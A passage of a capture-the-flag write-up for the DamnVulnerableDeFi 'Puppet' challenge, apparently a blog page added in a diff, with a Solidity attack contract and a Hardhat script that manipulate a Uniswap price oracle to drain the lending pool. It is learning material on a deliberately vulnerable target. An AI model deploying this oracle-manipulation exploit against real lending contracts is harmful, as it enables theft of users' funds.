+import &#34;./PuppetPool.sol&#34;;
+import &#34;./IUniswapExchange.sol&#34;;
+
+/**
+ * @title PuppetAttack
+ * @author teddyctf (https://thesavageteddy.github.io/posts/puppet-damnvulnerabledefi/)
+ */
+
+contract PuppetAttack {
+    constructor (
+        address owner,
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapExchange uniswapExchange,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v, bytes32 r, bytes32 s
+    ) payable {
+        // use permit and transfer tokens to this contract
+        token.permit(
+            owner,
+            spender,
+            value,
+            deadline,
+            v, r, s
+        );
+        token.transferFrom(owner, address(this), value);
+
+        // swap all our DVTs for ETH
+        token.approve(address(uniswapExchange), value);
+        uniswapExchange.tokenToEthSwapInput(
+            value, // swap all our DVTs
+            9.9 * 10**18, // for 9.9 ETH minimum
+            block.timestamp &#43; 3600 // deadline (not important)
+        );
+
+        // drain lending pool&#39;s DVTs, sending them to owner (player)
+        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
+        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
+            lendingPoolBalance
+        );
+        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
+    }
+}
+</code></pre>
+  </div>
+
+</p>
+<p>Relevant Hardhat solve script (full code <a href="puppet.challenge.js">here</a>):</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="200" type="checkbox" checked />
+    <label for="200">
+      <span class="collapsable-code__language">javascript</span>
+      <span class="collapsable-code__title">puppet.challenge.js</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+it(&#39;Execution&#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    // Attack contract address we obtained previously
+    let attackAddress = &#34;0x8464135c8F25Da09e49BC8782676a84730C318bC&#34;
+    let spender = attackAddress
+
+    // Hardhat requires a Wallet to obtain the signed
+    // transaction data, so make a Wallet for the player
+    const accounts = config.networks.hardhat.accounts;
+    const index = 1; // wallet of player
+    const playerWallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path &#43; `/${index}`);
+
+    expect(playerWallet.address).eq(player.address)
+
+    const chainId = (await ethers.provider.getNetwork()).chainId
+    const nonce = await token.nonces(playerWallet.address)
+    const name = await token.name()
+
+    // Number of tokens to be sent
+    const value = 1000n * 10n**18n
+    
+    // Unix timestamp for deadline
+    const deadline = (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp &#43; 3600
+
+    // Define Signature
+    const domain = {
+        name: name,
+        version: &#34;1&#34;,
+        verifyingContract: token.address,
+        chainId: chainId,
+    }
+
+    // Define types
+    const types = {
+        Permit: [
+            {name: &#34;owner&#34;, type: &#34;address&#34;},
+            {name: &#34;spender&#34;, type: &#34;address&#34;},
+            {name: &#34;value&#34;, type: &#34;uint256&#34;},
+            {name: &#34;nonce&#34;, type: &#34;uint256&#34;},
+            {name: &#34;deadline&#34;, type: &#34;uint256&#34;},
+        ]
+    }
+
+    // Define transaction
+    const values = {
+        owner: playerWallet.address,
+        spender: spender,
+        value: value,
+        nonce: nonce,
+        deadline: deadline,
+    }
+
+    // Sign data
+    const signature = await playerWallet._signTypedData(domain, types, values);
+
+    // Split signature
+    const sig = ethers.utils.splitSignature(signature);
+
+    attack = await (await ethers.getContractFactory(&#39;PuppetAttack&#39;, player)).deploy(
+        player.address,
+        token.address,
+        lendingPool.address,
+        uniswapExchange.address,
+        spender,
+        value,
+        deadline,
+        sig.v, sig.r, sig.s,
+        {
+            // send most ETH to the attack contract, keeping some for gas
+            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
+            gasLimit: 1e7
+        }
+    );
+});
+</code></pre>
+  </div>
+
+
+
+  <img src="./img/solved.png"  class="center"  style="border-radius: 5px; max-width: 80%;"  />
+
+
+<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This challenge was interesting, and I learnt a lot about ERC20 permits and oracle manipulation. Despite being the first out of a set of three challenges, its difficulty deceived me with the one transaction requirement.</p>
+<p>Huge thanks to <a href="https://twitter.com/farazsth98"><code>Faith</code></a> for helping with the one transaction requirement, and for teaching me a lot throughout my Web3 learning journey.</p>
+<p>As this is my first Web3 post, if I&rsquo;ve made any errors or anything to improve on, please let me know on Discord <code>thesavageteddy</code> or Twitter/X <a href="https://twitter.com/teddyctf"><code>@teddyctf</code></a>.</p>
+<p>Having almost finished DamnVulnerableDefi, I&rsquo;m looking at getting into auditing contracts soon!</p>
+<ul>
+<li>teddy / TheSavageTeddy</li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>teddyctf</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
